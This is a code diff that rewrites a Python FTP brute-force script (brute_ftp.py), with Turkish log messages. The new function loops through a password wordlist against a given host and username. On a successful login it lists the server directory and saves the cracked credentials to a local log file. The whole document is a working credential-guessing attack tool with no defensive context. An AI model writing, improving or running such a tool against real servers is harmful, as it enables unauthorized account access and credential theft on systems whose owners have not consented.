@@ -1,15 +1,23 @@
-from ftplib import FTP
-from utils import log_success, log_fail
+# brute_ftp.py
+from ftplib import FTP, error_perm
 
-def ftp_bruteforce(host, username, wordlist_path):
-    with open(wordlist_path, "r") as f:
-        for password in f:
-            password = password.strip()
-            try:
-                ftp = FTP(host)
-                ftp.login(user=username, passwd=password)
-                log_success(f"[+] Giriş başarılı: {password}")
-                ftp.quit()
-                return
-            except:
-                log_fail(f"[-] Hatalı parola: {password}")
+def ftp_brute_force(host, username, wordlist_file, port=21):
+    with open(wordlist_file, 'r') as file:
+        passwords = file.readlines()
+
+    for password in passwords:
+        password = password.strip()
+        try:
+            ftp = FTP()
+            ftp.connect(host, port, timeout=5)
+            ftp.login(username, password)
+            print(f"[✓] Giriş başarılı: {username}:{password}")
+            ftp.retrlines('LIST')
+            with open("ftp_success.log", "a") as log:
+                log.write(f"{username}:{password} @ {host}\n")
+            ftp.quit()
+            break
+        except error_perm:
+            print(f"[-] Hatalı parola: {password}")
+        except Exception as e:
+            print(f"[!] Hata oluştu: {str(e)}")
